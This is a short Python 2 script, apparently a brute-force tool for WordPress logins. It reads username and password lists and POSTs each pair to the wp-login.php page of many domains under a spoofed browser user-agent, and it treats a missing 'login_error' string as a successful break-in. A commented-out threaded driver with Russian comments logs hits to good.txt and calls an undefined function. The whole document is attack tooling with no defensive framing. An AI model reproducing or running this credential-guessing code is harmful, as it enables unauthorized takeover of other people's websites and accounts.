# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from Queue import Queue

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}

#----login.txt----
file = open('login.txt' , 'r')
l_list = file.readlines()
file.close()
#----password.txt----
file = open('pwd.txt' , 'r')
p_list = file.readlines()
file.close()
#----

domain_file = "domains.txt"

theard_count = 5

def brut(host, login, pwd):
    url = 'http://'+host+'/wp-login.php'
    payload = {'log': login, 'pwd': pwd}
    try:
        #response = requests.get('http://www.useragentstring.com', headers=headers)
        response = requests.post(url, data=payload, headers=headers, timeout = 10)
    except Exception:
        return False
    else:
        if response.text.find('login_error')<0:
            return True
        else:
            return False



'''def run(queue, result_queue):
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        print '{} checking in thread {}'.format(host, current_thread())
        # проверяем URL
        status = check_url(host)
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status:
            print '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
            open('good.txt', 'a+').write(host + '\n')
        else:
            pass
        print '{} finished in thread {}. Result={}'.format(host, current_thread(), status)
    print '{} closing'.format(current_thread())

# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()

    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(domain_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    # И ждем, когда задачи будут выполнены    
    queue.join()

    print time.time() - start_time

if __name__ == '__main__':
    main()'''
